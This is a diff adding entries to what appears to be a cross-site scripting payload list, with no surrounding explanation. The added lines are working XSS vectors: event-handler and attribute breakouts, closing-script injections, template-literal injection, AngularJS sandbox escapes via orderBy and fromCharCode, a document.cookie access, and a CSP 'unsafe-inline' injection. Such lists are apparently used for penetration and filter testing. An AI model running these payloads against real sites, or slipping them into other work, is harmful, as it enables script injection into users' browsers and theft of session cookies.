@@ -23,3 +23,16 @@ $eval('x=alert(1)')
 [123]|orderBy:'Some string'
 <input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
 [1].map(alert)
+'-alert(1)-'
+<img src=1 onerror=print()>
+?'accesskey='x'onclick='alert(1)
+'accesskey='x'onclick='alert(1)
+"><svg><animatetransform onbegin=alert(1)>
+</script><script>alert(1)</script>
+\'-alert(1)//
+${alert(1)}
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
+1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x';
+<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
